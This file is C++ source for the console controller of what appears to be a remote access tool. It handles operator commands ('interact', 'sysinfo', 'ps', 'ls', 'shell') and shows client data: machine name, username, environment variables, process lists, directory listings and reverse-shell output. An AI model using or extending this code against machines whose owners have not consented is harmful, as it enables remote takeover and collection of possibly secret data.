#include "ConsoleUiMediator.h"
#include <boost/thread.hpp>
#include <boost/bind.hpp>
#include <iostream>
#include "../../concurrent/channels/double/UiAppEventDoubleQueueThreadChannel.h"
#include "../../concurrent/events/AppEvent.h"
#include "../../../../shared/NetLib/packets/Packet.h"
#include "../../../../shared/NetLib/packets/PacketPresentation.h"
#include "../../concurrent/events/ClientAppEvent.h"
#include <boost/lexical_cast.hpp>
#include <boost/uuid/uuid_io.hpp> // <-- needed for lexical_cast<string>(uuid)
#include "views/MainView.h"
#include "views/ProcessView.h"
#include "views/FileSystemView.h"

#include <boost/algorithm/string.hpp>
// #include <boost/algorithm/string/join.hpp>
#include "../../../../shared/NetLib/packets/PacketFileSystem.h"
#include "views/ShellView.h"
#include "../../../../shared/NetLib/packets/PacketShell.h"
#include "../../../../shared/NetLib/packets/PacketInformation.h"
#include <boost/foreach.hpp>
#include "../../../../shared/NetLib/packets/PacketProcess.h"

ConsoleUiMediator::ConsoleUiMediator()
{
}

ConsoleUiMediator::~ConsoleUiMediator()
{
}

void ConsoleUiMediator::mainLoop()
{
	processView = boost::make_shared<ProcessView>(shared_from_this());
	fileSystemView = boost::make_shared<FileSystemView>(shared_from_this());
	mainView = boost::make_shared<MainView>(shared_from_this());
	shellView = boost::make_shared<ShellView>(shared_from_this());
	currentView = mainView;

	running = true;
	
	boost::thread th(boost::bind(&ConsoleUiMediator::receiveAppEvent, shared_from_this()));

	while (running)
	{
		std::vector<std::string> parts = this->currentView->loop();
		if (!handleInstruction(parts))
		{
			boost::shared_ptr<AppEvent> event = getEventForInstruction(parts);
			if (event != nullptr)
				uiChannel->submitToApp(event);
			else
				std::cerr << "Null Event received" << std::endl;
		}
	}
}

bool ConsoleUiMediator::handleInstruction(const std::vector<std::string>& parts) const
{
	if (parts.size() == 1)
	{
		const std::string& firstPart = parts.at(0);
		if (firstPart.empty())
			return true;

		if (currentView != shellView && (boost::iequals(firstPart, "quit") || boost::iequals(firstPart, "exit")))
		{
			exit(0);
		}
	}

	if (activeClient != nullptr)
	{
		return handleInstructionInteracting(parts);
	}
	else
	{
		return handleInstructionNotInteracting(parts);
	}
}

boost::shared_ptr<AppEvent> ConsoleUiMediator::getEventForInstruction(const std::vector<std::string>& parts)
{
	const std::string& firstPart = parts.at(0);
	{
		boost::shared_lock_guard<boost::shared_mutex> lock(clientMutex);

		if (activeClient != nullptr)
		{
			// Interacting with client
			if (currentView == shellView)
			{
				// If current view is reverse shell view then forward everything to remote shell
				std::string command = boost::algorithm::join(parts, " ");
				auto commandPtr = boost::make_shared<std::string>(command);
				return boost::make_shared<ClientAppEvent>(Subject::Shell, Action::Push, activeClient, commandPtr);
			}
			if (boost::iequals(parts.at(0), "sysinfo"))
			{
				return boost::make_shared<ClientAppEvent>(Subject::Information, Action::Fetch, activeClient);
			}
			if (boost::iequals(parts.at(0), "ps"))
			{
				return boost::make_shared<ClientAppEvent>(Subject::Process, Action::Start, activeClient);
			}
			if (boost::iequals(firstPart, "ls"))
			{
				boost::shared_ptr<std::wstring> pathString = nullptr;
				if (parts.size() == 1)
				{
					if (currentView == fileSystemView && fileSystemView->currentPath != nullptr)
						pathString = boost::make_shared<std::wstring>(fileSystemView->currentPath.wstring());
				}
				else if (parts.size() > 1)
				{
					const boost::filesystem::path path = parts.at(1);
					if (path.is_absolute())
					{
						pathString = boost::make_shared<std::wstring>(path.lexically_normal().wstring());
					}
					if (currentView == fileSystemView && fileSystemView->currentPath != nullptr)
					{
						pathString = boost::make_shared<std::wstring>(fileSystemView->joinPath(path).wstring());
					}
				}

				return boost::make_shared<ClientAppEvent>(Subject::FileSystem,
				                                          Action::Get,
				                                          activeClient, pathString);
			}
			if (boost::iequals(parts.at(0), "shell"))
			{
				currentView = shellView;
				return boost::make_shared<ClientAppEvent>(Subject::Shell, Action::Start, activeClient);
			}
			else
			{
				std::cout << "Unknown Instruction" << std::endl;
			}
		}
		else
		{
			if (boost::iequals(firstPart, "interact"))
			{
				unsigned long long clientId = boost::lexical_cast<unsigned long long>(parts.at(1));

				return boost::make_shared<ClientAppEvent>(Subject::Connection, Action::Start, clientId);
			}
			else if (parts.size() == 1 && boost::iequals(firstPart, "ls"))
			{
				return boost::make_shared<AppEvent>(Target::Server, Subject::Connection, Action::ListAvailable);
			}
		}

		return nullptr;
	}
}


bool ConsoleUiMediator::handleInstructionInteracting(const std::vector<std::string>& parts) const
{
	return false;
}


bool ConsoleUiMediator::handleInstructionNotInteracting(const std::vector<std::string>& parts) const
{
	return false;
}

void ConsoleUiMediator::setActiveClient(const boost::shared_ptr<Client>& client)
{
	{
		boost::unique_lock<boost::shared_mutex> lock(clientMutex);
		this->activeClient = client;
		auto clientView = boost::dynamic_pointer_cast<IClientView>(currentView);


		if (clientView != nullptr)
			clientView->setActiveClient(client);

		currentView->printBanner();
	}
}

void ConsoleUiMediator::receiveAppEvent()
{
	running = true;
	while (running)
	{
		const boost::shared_ptr<AppEvent> appEvent = uiChannel->takeFromApp();
		const Target target = appEvent->target;
		const Subject subject = appEvent->subject;
		boost::shared_ptr<void> object = appEvent->object;
		const Action action = appEvent->action;

		if (target == Target::Server)
		{
			if (subject == Subject::Connection)
			{
				if (action == Action::ListAvailable)
				{
					std::vector<Client>* clients = (std::vector<Client>*)object.get();
					MainView::printClientList(*clients);

					currentView->printBanner();
				}
			}
		}
		else if (target == Target::Client)
		{
			const boost::shared_ptr<ClientAppEvent> clientEvent = boost::dynamic_pointer_cast<ClientAppEvent>(
				appEvent);
			const boost::shared_ptr<Client> client = clientEvent->client;
			boost::uuids::uuid clientUuid = client->uuid;
			const int64_t clientId = client->clientId;
			std::string clientUuidStr = boost::lexical_cast<std::string>(clientUuid);

			if (subject == Subject::Connection)
			{
				if (action == Action::Start)
				{
					if (client == nullptr)
					{
						// Client not found
						std::cout << "Client " << clientId << " not found" << std::endl;
						continue;
					}
					setActiveClient(client);
				}
			}
			else if (subject == Subject::PacketReceived)
			{
				Packet* packet = (Packet*)object.get();
				if (packet->packetType == PacketType::Presentation)
				{
					PacketPresentation* packetPresentation = static_cast<PacketPresentation*>(packet);

					MainView::printNewClientConnection(client->clientId, clientUuidStr,
					                                   packetPresentation->sysInfo.pcName,
					                                   packetPresentation->sysInfo.osName,
					                                   packetPresentation->sysInfo.username);
					setActiveClient(client);
					currentView->printBanner();
				}
				else if (packet->packetType == PacketType::ClientInformation)
				{
					auto packetInformation = static_cast<PacketInformation*>(packet);
					std::wostringstream clientInformation;
					clientInformation << "\n============= Client Information =================";
					clientInformation << packetInformation->pcName.c_str() << "\n";
					clientInformation << "==========================" << std::endl;
					clientInformation << "Username: " << packetInformation->username << std::endl
						<< "OS Name: " << packetInformation->osName.c_str()
						<< std::endl << std::endl << std::endl
						<< "Environment variables" << std::endl;


					std::for_each(packetInformation->environment.begin(),
					              packetInformation->environment.end(),
					              [&](const std::pair<std::string, std::string>& keyPair)
					              {
						              clientInformation << keyPair.first.c_str() << " = " << keyPair.second.c_str() <<
							              std::endl;
					              });


					currentView->wprint(clientInformation.str());
					currentView->printBanner();
				}
				else if (packet->packetType == PacketType::FileSystem)
				{
					PacketFileSystem* packetFs = (PacketFileSystem*)packet;
					if (packetFs->fileSystemFocus == PacketFileSystem::FileSystemFocus::ListDirEntries)
					{
						FileSystemView::printListDirectory(packetFs->path, packetFs->files);
						currentView->printBanner();
					}
				}
				else if (packet->packetType == PacketType::Process)
				{
					PacketProcess* packetProcess = (PacketProcess*)packet;
					ProcessView::printProcesses(packetProcess->processes);
					currentView->printBanner();
				}
				else if (packet->packetType == PacketType::Shell)
				{
					PacketShell* packetShell = (PacketShell*)packet;
					if (packetShell->action == PacketShell::PacketAction::Exec)
					{
						shellView->print(packetShell->data);
					}
					else if (packetShell->action == PacketShell::PacketAction::Stop)
					{
						if (currentView == shellView
							&& clientId == this->activeClient->getId())
						{
							currentView = mainView;
							mainView->print("Shell session stopped");
							currentView->printBanner();
						}
					}
				}
			}
		}
	}
}


void ConsoleUiMediator::setUiChannel(const boost::shared_ptr<UiAppEventDoubleQueueThreadChannel>& uiChannel)
{
	this->uiChannel = uiChannel;
}
